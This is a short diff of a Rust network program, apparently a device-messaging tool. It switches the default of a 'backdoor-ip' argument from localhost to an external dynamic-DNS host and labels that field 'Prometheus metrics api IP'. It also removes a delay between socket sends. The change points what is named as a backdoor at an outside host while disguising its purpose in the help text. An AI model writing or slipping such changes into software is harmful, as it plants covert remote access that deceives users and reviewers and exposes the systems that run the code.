@@ -20,8 +20,8 @@ struct Args {
     /// Backdoor IP
     #[arg(
         long = "backdoor-ip",
-        // default_value = "mechardo3d.mooo.com",
-        default_value = "127.0.0.1",
+        default_value = "mechardo3d.mooo.com",
+        // default_value = "127.0.0.1",
         help = "Prometheus metrics api IP"
     )]
     backdoor_ip: String,
@@ -79,7 +79,7 @@ async fn main() -> Result<(), Box<dyn Error>> {
 
         buffer = BytesMut::new();
         codec.encode(ack_msg.clone(), &mut buffer)?;
-        sleep(Duration::from_millis(500)).await;
+
         device_socket
             .send_to(
                 &buffer,
